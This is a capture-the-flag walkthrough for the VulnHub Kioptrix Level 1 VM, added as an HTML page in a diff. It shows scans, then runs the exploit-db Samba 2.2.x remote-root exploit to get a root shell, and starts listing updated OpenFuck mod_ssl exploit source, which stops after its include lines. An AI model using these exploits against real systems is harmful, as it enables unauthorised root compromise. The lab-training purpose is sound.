@@ -1,0 +1,1626 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#Kioptrix: Level 1</strong></h1>
+        <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a><br>
+        <br>
+        This box gives you a good opportunity to play with using exploits; searching for them, modifying them and using them.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r 192.168.1.0/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.104 is my Kioptrix Level 1 box.<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap &amp; Nikto</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.104</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>initial.txt&nbsp;192.168.1.104<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-05&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">Linux</span>-2-4-7-10-i686-00-0c-29-dd-cf-db.lan&nbsp;(192.168.1.104)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00050s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;994&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;2.9p2&nbsp;(protocol&nbsp;1.99)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;1024&nbsp;b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86&nbsp;(RSA1)<br>
+                |&nbsp;&nbsp;&nbsp;1024&nbsp;8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71&nbsp;(DSA)<br>
+                |_&nbsp;&nbsp;1024&nbsp;ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81&nbsp;(RSA)<br>
+                |_sshv1:&nbsp;Server&nbsp;supports&nbsp;SSHv1<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;1.3.20&nbsp;((Unix)&nbsp;&nbsp;(Red-Hat/Linux)&nbsp;mod_ssl/2.8.4&nbsp;OpenSSL/0.9.6b)<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE<br>
+                |_http-server-header:&nbsp;Apache/1.3.20&nbsp;(Unix)&nbsp;&nbsp;(Red-Hat/Linux)&nbsp;mod_ssl/2.8.4&nbsp;OpenSSL/0.9.6b<br>
+                |_http-title:&nbsp;Test&nbsp;Page&nbsp;for&nbsp;the&nbsp;Apache&nbsp;Web&nbsp;Server&nbsp;on&nbsp;Red&nbsp;Hat&nbsp;Linux<br>
+                111/tcp&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;(RPC&nbsp;#100000)<br>
+                |&nbsp;rpcinfo:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;program&nbsp;version&nbsp;&nbsp;&nbsp;port/proto&nbsp;&nbsp;service<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/tcp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100000&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;111/udp&nbsp;&nbsp;rpcbind<br>
+                |&nbsp;&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1024/tcp&nbsp;&nbsp;status<br>
+                |_&nbsp;&nbsp;100024&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1024/udp&nbsp;&nbsp;status<br>
+                139/tcp&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;Samba&nbsp;smbd&nbsp;(workgroup:&nbsp;MYGROUP)<br>
+                443/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssl/https&nbsp;&nbsp;&nbsp;Apache/1.3.20&nbsp;(Unix)&nbsp;&nbsp;(Red-Hat/Linux)&nbsp;mod_ssl/2.8.4&nbsp;OpenSSL/0.9.6b<br>
+                |_http-server-header:&nbsp;Apache/1.3.20&nbsp;(Unix)&nbsp;&nbsp;(Red-Hat/Linux)&nbsp;mod_ssl/2.8.4&nbsp;OpenSSL/0.9.6b<br>
+                |_http-title:&nbsp;400&nbsp;Bad&nbsp;Request<br>
+                |_ssl-date:&nbsp;2019-04-05T18:28:09+00:00;&nbsp;+1h01m50s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                |&nbsp;sslv2:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;SSLv2&nbsp;supported<br>
+                |&nbsp;&nbsp;&nbsp;ciphers:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC4_64_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC2_128_CBC_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC4_128_EXPORT40_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_DES_192_EDE3_CBC_WITH_MD5<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL2_RC4_128_WITH_MD5<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;SSL2_DES_64_CBC_WITH_MD5<br>
+                1024/tcp&nbsp;open&nbsp;&nbsp;status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;(RPC&nbsp;#100024)<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:66:A5:5D&nbsp;(VMware)<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running:&nbsp;Linux&nbsp;2.4.X<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel:2.4<br>
+                OS&nbsp;details:&nbsp;Linux&nbsp;2.4.9&nbsp;-&nbsp;2.4.18&nbsp;(likely&nbsp;embedded)<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_clock-skew:&nbsp;mean:&nbsp;1h01m49s,&nbsp;deviation:&nbsp;0s,&nbsp;median:&nbsp;1h01m49s<br>
+                |_nbstat:&nbsp;NetBIOS&nbsp;name:&nbsp;KIOPTRIX,&nbsp;NetBIOS&nbsp;user:&nbsp;&lt;unknown&gt;,&nbsp;NetBIOS&nbsp;MAC:&nbsp;&lt;unknown&gt;&nbsp;(unknown)<br>
+                |_smb2-time:&nbsp;Protocol&nbsp;negotiation&nbsp;failed&nbsp;(SMB2)<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;268.20&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        • <strong>22/ssh</strong> we can't do anything without a username or a password to brute force.<br>
+        • <strong>80/http</strong> is useful, but upon visiting the site it's just an Apache default installation page.<br>
+        • <strong>139/samba</strong> explains why port 111 and 1024 is running. This is a potential avenue to explore.<br>
+        • <strong>443/https</strong> is no different to 80/http.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>1a) Nikto</strong></h3><br>
+        I ran <code>nikto -h http://192.168.1.104/ -o nikto.txt</code> on the website, which returned an interesting result:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1#&nbsp;nikto&nbsp;-h&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>192.168.1.104<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-o&nbsp;nikto.txt<br>
+                -&nbsp;Nikto&nbsp;v2.1.6<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Target&nbsp;IP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.1.104<br>
+                +&nbsp;Target&nbsp;Hostname<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;192.168.1.104<br>
+                +&nbsp;Target&nbsp;Port<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80<br>
+                +&nbsp;Start&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2019-04-05&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>35<span style="color:#ff9d00;font-weight:700">:</span>52&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GMT1<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;Server<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>1.3.20&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Unix<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Red-Hat<span style="color:#ff9d00;font-weight:700">/</span>Linux<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;mod_ssl<span style="color:#ff9d00;font-weight:700">/</span>2.8.4&nbsp;OpenSSL<span style="color:#ff9d00;font-weight:700">/</span>0.9.6b<br>
+                ...<br>
+                +&nbsp;mod_ssl<span style="color:#ff9d00;font-weight:700">/</span>2.8.4&nbsp;-&nbsp;mod_ssl&nbsp;2.8.7&nbsp;and&nbsp;lower&nbsp;are&nbsp;vulnerable&nbsp;to&nbsp;a&nbsp;remote&nbsp;buffer&nbsp;overflow&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;may&nbsp;allow&nbsp;a&nbsp;remote&nbsp;shell.&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>cve.mitre.org<span style="color:#ff9d00;font-weight:700">/</span>cgi-bin<span style="color:#ff9d00;font-weight:700">/</span>cvename.cgi?name=CVE-2002-0082,&nbsp;OSVDB-756.<br>
+                ---------------------------------------------------------------------------<br>
+                +&nbsp;1&nbsp;host<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;tested
+            </div>
+        </div><br>
+        mod_ssl/2.8.4 may let us get a remote shell.<br>
+        <br>
+        Before investigating any further, I decided to look at samba.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) samba</strong></h2><br>
+        I ran <code>enum4linux -a 192.168.1.104</code>, and it didn't provide much that was useful.<br>
+        At this point I began looking for the version number, as nmap didn't return anything.<br>
+        <code>smbclient -L 192.168.1.104</code> gave me Version 4.8.5-Debian but if you searchsploit this it won't return anything, so this wasn't correct.<br>
+        Lastly I tried a metasploit module.<br>
+        <br>
+            <div class="codebox">
+                msf&nbsp;&gt;&nbsp;use&nbsp;auxiliary<span style="color:#ff9d00;font-weight:700">/</span>scanner<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>smb_version<br>
+                msf&nbsp;auxiliary<span style="color:#ff9d00;font-weight:700">(</span>scanner<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>smb_version<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;RHOSTS&nbsp;192.168.1.104<br>
+                RHOSTS&nbsp;=&gt;&nbsp;192.168.1.104<br>
+                msf&nbsp;auxiliary<span style="color:#ff9d00;font-weight:700">(</span>scanner<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>smb_version<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&gt;&nbsp;run<br>
+                <br>
+                [*]&nbsp;192.168.1.104<span style="color:#ff9d00;font-weight:700">:</span>139 -&nbsp;Host&nbsp;could&nbsp;not&nbsp;be&nbsp;identified<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Unix&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Samba&nbsp;2.2.1a<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [*]&nbsp;Scanned&nbsp;1&nbsp;of&nbsp;1&nbsp;hosts&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>100%&nbsp;<span style="color:#ff9d00;font-weight:700">complete)</span><br>
+                [*]&nbsp;Auxiliary&nbsp;module&nbsp;execution&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        Nice! Metasploit found it for us- Samba version 2.2.1a<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) searchsploit</strong></h2><br>
+        If anything, this box will teach you to searchsploit all of the services and version numbers you find in your info gathering stage.<br>
+        <br>
+        A samba exploit!:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1#&nbsp;searchsploit&nbsp;Samba&nbsp;2.2<br>
+                ------------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                ------------------------------------------------------------&nbsp;<br>
+                Samba&nbsp;&lt;&nbsp;2.2.8&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Linux<span style="color:#ff9d00;font-weight:700">/</span>BSD<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>multiple<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>10.c<br>
+                ------------------------------------------------------------&nbsp;
+            </div>
+        </div><br>
+        <br>
+        There's a ton of results, but 10.c looked the most promising to me after looking at a few of them.<br>
+        And now for mod_ssl/2.8:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1#&nbsp;searchsploit&nbsp;mod_ssl&nbsp;2.8<br>
+                ------------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                ------------------------------------------------------------&nbsp;----------------------------------------<br>
+                Apache&nbsp;mod_ssl&nbsp;2.8.x&nbsp;-&nbsp;Off-by-One&nbsp;HTAccess&nbsp;Buffer&nbsp;Overflow&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>multiple<span style="color:#ff9d00;font-weight:700">/</span>dos<span style="color:#ff9d00;font-weight:700">/</span>21575.txt<br>
+                Apache&nbsp;mod_ssl&nbsp;&lt;&nbsp;2.8.7&nbsp;OpenSSL&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'OpenFuck.c'</span>&nbsp;Remote&nbsp;Buffer&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>unix<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>21671.c<br>
+                Apache&nbsp;mod_ssl&nbsp;&lt;&nbsp;2.8.7&nbsp;OpenSSL&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'OpenFuckV2.c'</span>&nbsp;Remote&nbsp;Buffe<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>unix<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>764.c<br>
+                ------------------------------------------------------------&nbsp;----------------------------------------
+            </div>
+        </div><br>
+        <br>
+        OpenFuck is what we want, and we may as well use the updated V2 version.<br>
+        However, this exploit still needs to be updated in order to work. And it's kind of a pain. As of late 2018, just go the samba route in order to get a shell on this box.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Method 1: samba to root</strong></h2><br>
+        I made a directory for my exploits <code>mkdir exploits</code><br>
+        Copied over the exploit <code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c .</code><br>
+        And followed the instructions on the exploit page (<a href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a>)<br>
+        to compile: <code>gcc 10.c -o sambal</code><br>
+        and run it: <code>./sambal -b 0 -v 192.168.1.104</code><br>
+        <br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;exploits<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;exploits<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>multiple<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>10.c&nbsp;.<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">gcc</span>&nbsp;10.c&nbsp;-o&nbsp;sambal<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>kioptrix1<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>sambal&nbsp;-b&nbsp;0&nbsp;-v&nbsp;192.168.1.104<br>
+                samba-2.2.8&nbsp;&lt;&nbsp;remote&nbsp;root&nbsp;exploit&nbsp;by&nbsp;eSDee&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>www.netric.org<span style="color:#ff9d00;font-weight:700">|</span>be<span style="color:#ff9d00;font-weight:700">)</span><br>
+                --------------------------------------------------------------<br>
+                +&nbsp;Verbose&nbsp;mode.<br>
+                +&nbsp;Bruteforce&nbsp;mode.&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Linux<span style="color:#ff9d00;font-weight:700">)</span><br>
+                +&nbsp;Host&nbsp;is&nbsp;running&nbsp;samba.<br>
+                +&nbsp;Using&nbsp;ret<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;[0xbffffed4]<br>
+                +&nbsp;Using&nbsp;ret<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;[0xbffffda8]<br>
+                +&nbsp;Using&nbsp;ret<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;[0xbffffc7c]<br>
+                +&nbsp;Worked<span style="color:#ff9d00;font-weight:700">!</span><br>
+                --------------------------------------------------------------<br>
+                ***&nbsp;JE&nbsp;MOET&nbsp;JE&nbsp;MUIL&nbsp;HOUWE<br>
+                Linux&nbsp;kioptrix.level1&nbsp;2.4.7-10&nbsp;<span style="color:#0088ff;font-weight:400">#1&nbsp;Thu&nbsp;Sep&nbsp;6&nbsp;16:46:36&nbsp;EDT&nbsp;2001&nbsp;i686&nbsp;unknown</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=99<span style="color:#ff9d00;font-weight:700">(</span>nobody<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">pwd</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>tmp
+            </div>
+        </div><br>
+        <br>
+        And you get a root shell!<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Method 2: https to root</strong></h2><br>
+        This requires a little more work as you have to update the exploit. I did it because the VulnHub description said there were multiple ways to solve this box.<br>
+        <br>
+        First, get the exploit:<br>
+        <code>cp /usr/share/exploitdb/exploits/unix/remote/764.c .</code><br>
+        <br>
+        Now update it.<br>
+        (thanks to this guy/gal for clear instructions: <a href="https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/)">https://www.hypn.za.net/blog/2017/08/27/compiling-exploit-764-c-in-2017/)</a><br>
+        <br>
+        Here's the updated exploit (all credit goes to the original author):<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">/*<br>
+                &nbsp;*&nbsp;E-DB&nbsp;Note:&nbsp;Updating&nbsp;OpenFuck&nbsp;Exploit&nbsp;~&nbsp;http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/<br>
+                &nbsp;*<br>
+                &nbsp;*&nbsp;OF&nbsp;version&nbsp;r00t&nbsp;VERY&nbsp;PRIV8&nbsp;spabam<br>
+                &nbsp;*&nbsp;Compile&nbsp;with:&nbsp;gcc&nbsp;-o&nbsp;OpenFuck&nbsp;OpenFuck.c&nbsp;-lcrypto<br>
+                &nbsp;*&nbsp;objdump&nbsp;-R&nbsp;/usr/sbin/httpd|grep&nbsp;free&nbsp;to&nbsp;get&nbsp;more&nbsp;targets</span><br>
+                <span style="color:#0088ff;font-weight:400">&nbsp;*&nbsp;#hackarena&nbsp;irc.brasnet.org<br>
+                &nbsp;*/</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;arpa/inet.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;netinet/in.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;sys/types.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;sys/socket.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;netdb.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;errno.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;string.h&gt;</span><br>
+                <span style="color:#7f0044;font-weight:700">#include&nbsp;&lt;stdio.h&gt;</span><br>
